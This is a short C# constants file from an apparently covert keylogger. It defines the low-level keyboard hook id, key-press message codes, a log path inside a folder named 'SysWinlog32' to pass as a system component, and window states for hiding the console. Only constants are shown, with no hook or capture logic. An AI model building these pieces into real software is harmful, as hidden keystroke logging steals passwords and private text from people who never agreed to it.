
namespace ConsoleApp2.Constants
{
    class Constants
    {
        public const int whl_keyboard_ll = 13;
        public const int wm_keydown = 0x0100;
        public const int wm_keyup   = 0x0101;

        // path to the key-log file
        public const string KeyLogPath = @"/SysWinlog32/logs/log.txt";

        // directory of key-log file
        public const string LogDir = @"/SysWinlog32/logs";

        // translate the key code into an unshifted character value
        public const int mapvk_to_char = 0x02;
        public enum ConsoleWindowState
        {
            SW_HIDE = 0,
            SW_SHOW = 5
        };
    }
}
